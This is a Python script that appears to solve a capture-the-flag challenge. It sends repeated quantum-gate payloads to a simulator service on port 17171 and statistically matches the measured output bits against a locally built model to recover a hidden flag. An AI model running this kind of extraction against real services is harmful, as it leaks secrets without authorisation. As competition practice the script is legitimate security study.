#!/usr/bin/env python3

import os
import sys
import json
import math
import string
import socket
import subprocess

from threading import Thread


IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
PORT = 17171


def generate_payload():
    operation = 'Ry ' + str(-math.pi / 2)
    operations = []

    for i in range(1, 8):
        operations.extend([
            'SWAP', str(i),
            operation,
            'SWAP', str(i),
        ])

    return operation + ' ' + ' '.join(operations)


def get_remote_io():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    
    sock.connect((IP, PORT))

    file = sock.makefile('rwb')

    return file, file


def get_local_io():
    args = ['dotnet', './deploy/service/ZN.Runner.dll']
    process = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    return process.stdin, process.stdout


def send_payload(io, payload, repeat):
    for _ in range(repeat):
        io.write((payload + os.linesep).encode())
        io.flush()

    io.write(os.linesep.encode())
    io.flush()


def read_output(io, repeat):
    for i in range(repeat):
        print('\rReading line... [ %d / %d ]' % (i + 1, repeat), end='')

        line = io.readline().strip().replace(b'>>> ', b'')

        if len(line) == 0:
            break

        yield line

    print()


def calculate_counters(io, repeat):
    bitsize = 8
    
    payload = generate_payload()
    fin, fout = io
    thread = Thread(target=send_payload, args=(fin, payload, repeat), daemon=True)
    thread.start()
    
    counters = []

    for i, line in enumerate(read_output(fout, repeat)):
        data = bytes.fromhex(line.decode())

        for i, byte in enumerate(data):
            bits = bin(byte)[2:].zfill(bitsize)
            
            if len(counters) <= i:
                counters.append([0] * bitsize)

            for k, bit in enumerate(bits):
                counters[i][k] += int(bit)

    return counters


def write_local_flag(text):
    filename = 'flag.txt'

    with open(filename, 'w') as file:
        file.write(text)


def construct_model(alphabet, repeat):
    write_local_flag(alphabet)

    counters = calculate_counters(get_local_io(), repeat)

    return dict((symbol, counter) for symbol, counter in zip(alphabet, counters)) 


def save_model(model):
    filename = 'model.json'

    with open(filename, 'w') as file:
        json.dump(model, file)


def load_model():
    filename = 'model.json'

    with open(filename, 'r') as file:
        return json.load(file)
        

def counters_equal(counter1, counter2, eps):
    for x, y in zip(counter1, counter2):
        if abs(x - y) > eps:
            return False

    return True


def try_get_flag(model, counters, eps):
    flag = []

    for counter in counters:
        symbols = []

        for symbol in model:
            if counters_equal(model[symbol], counter, eps):
                symbols.append(symbol)

        if len(symbols) != 1:
            return None

        flag.append(symbols[0])

    return ''.join(flag)


def main():
    repeat = 5000
    alphabet = string.ascii_letters + string.digits + '{}_'

    # model = construct_model(alphabet, repeat)
    # save_model(model)
    # print('Model saved')
    # return
    model = load_model()
    print('Model loaded')

    counters = calculate_counters(get_remote_io(), repeat)
    print('Counters loaded')

    possible_flags = set()

    for eps in range(1, repeat):
        possible_flag = try_get_flag(model, counters, eps)

        if possible_flag is not None:
            possible_flags.add(possible_flag)

    print(possible_flags)


if __name__ == '__main__':
    main()
